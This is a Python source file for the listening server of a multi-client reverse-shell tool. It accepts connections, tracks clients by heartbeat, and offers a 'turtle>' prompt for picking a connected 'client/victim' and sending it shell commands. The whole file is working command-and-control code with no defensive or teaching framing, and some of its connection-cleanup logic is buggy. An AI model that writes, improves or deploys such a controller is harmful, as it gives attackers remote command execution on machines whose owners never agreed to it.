import socket
import sys
import threading
import time
from queue import Queue
from collections import defaultdict
NUMBER_OF_THREADS = 3
JOB_NUMBER = [1, 2, 3]
queue = Queue()
all_connections = {}
hb_connections = {}

port = int(sys.argv[1])
hb_rate = 1
max_failure = 5
# Create a Socket ( connect two computers)

help_info = ' ----------------------------------------------------------------\n' \
            '|Help info: use below commands to find clients or control        |\n' \
            '|list: display connected client and address                      |\n' \
            '|select <client id>: select client and return the reversed shell |\n' \
            '|heartbeat: display the client side heart beat daemon            |\n' \
            '|exit: log out remote client shell                               |\n' \
            ' ----------------------------------------------------------------\n'

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = port if port else 8091
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def clear_all():
    for i, (_, _) in all_connections.items():
        clear_connection(i)

    for i, (_, _) in hb_connections.items():
        clear_connection(i)


def accepting_connections():
    # close shell connections
    clear_all()

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout
        except:
            print("Error accepting connections")

        data = None
        try:
            data = conn.recv(1024)
        except:
            print("error in receiving data")
        # empty for shell process, else for hb
        if data == b' ':
            new_client = max(all_connections) + 1 if all_connections else 0
            all_connections[new_client] = (conn, address)
            print("Connection has been established :" + address[0], address[1], flush=True)
            print(help_info)

        else:
            new_client = max(hb_connections) + 1 if hb_connections else 0
            hb_connections[new_client] = (conn, address)


def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif 'heartbeat' in cmd:
            show_client_daemon()
        elif cmd =='':
            continue
        else:
            print("Command not recognized")


def show_client_daemon():
    for i, (conn, address) in hb_connections.items():
        results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
        print("----Clients----" + "\n" + results)


def hb_test():
    hb_failures = defaultdict(int)
    while True:
        time.sleep(hb_rate)
        hb_keys = list(hb_connections.keys())
        for i in hb_keys:
            try:
                hb_connections[i][0].send(str.encode(' '))
            except:
                hb_failures[i] += 1
            if hb_failures[i] > max_failure:
                msg = "client {} no response for {}s "
                print(msg.format(i, hb_failures[i] * hb_rate ))
                print("disconnect client", i, end='\n')
                clear_connection(i)
                hb_failures[i] = 0


# Display all current active connections with client
def clear_connection(i):
    all_connections[i][0].close()
    del all_connections[i]
    hb_connections[i][0].close()
    del hb_connections[i]

def list_connections():
    to_remove = []
    for i, (conn, address) in all_connections.items():
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            to_remove.append(i)
            continue
        results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
        print("----Clients----" + "\n" + results)
    for i in to_remove:
        clear_connection(i)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn, address = all_connections[target]
        print("You are now connected to :" + str(address[0]))
        print(str(address[0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'exit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        # set worker as daemon; daemon terminates after main ends
        t.setDaemon(True)
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        if x == 3:
            hb_test()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()